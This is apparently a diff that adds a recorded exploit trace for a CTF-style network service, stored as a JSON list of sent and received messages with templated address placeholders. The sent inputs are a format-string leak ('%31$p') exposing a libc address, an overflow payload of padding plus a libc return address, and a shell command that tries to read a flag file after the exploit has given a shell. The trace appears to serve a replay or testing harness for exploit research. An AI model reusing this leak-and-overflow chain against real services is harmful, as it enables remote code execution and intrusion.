@@ -1,0 +1,9 @@
+[
+    "1Who r u?\\n", 
+    "0%31$p\\n", 
+    "1welcome!0x{{{LIBC_BASE:133168:12:HEX:10:0x7f60183f5830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{{LIBC_BASE:283158:8:ORI:72:0x7f601841a216}}}caaadaaa\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{{LIBC_BASE:283158:6:ORI:72:0x7f601841a216}}}HTTP/1.1 404 Not Found\\r\\nContent-Type: tex{{{HEAP_BASE:65396:3:ORI:119:0x682f74}}}tml;{{{HEAP_BASE:78624:3:ORI:126:0x686320}}}arset=UTF-8\\r\\nContent-L{{{HEAP_BASE:15973:3:ORI:151:0x676e65}}}th: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r{{{HEAP_BASE:68618:3:ORI:191:0x683c0a}}}3>{{{HEAP_BASE:12624:3:ORI:196:0x676150}}}e Not Found{{{HEAP_BASE:65340:3:ORI:210:0x682f3c}}}3>", 
+    "0cat /f{{{HEAP_BASE:12652:3:ORI:21:0x67616c}}}s/fake{{{HEAP_BASE:13151:3:ORI:15:0x67635f}}}i/f{{{HEAP_BASE:12652:3:ORI:21:0x67616c}}}\\n", 
+    "2sh: 1: cat: Permission denied\\n"
+]
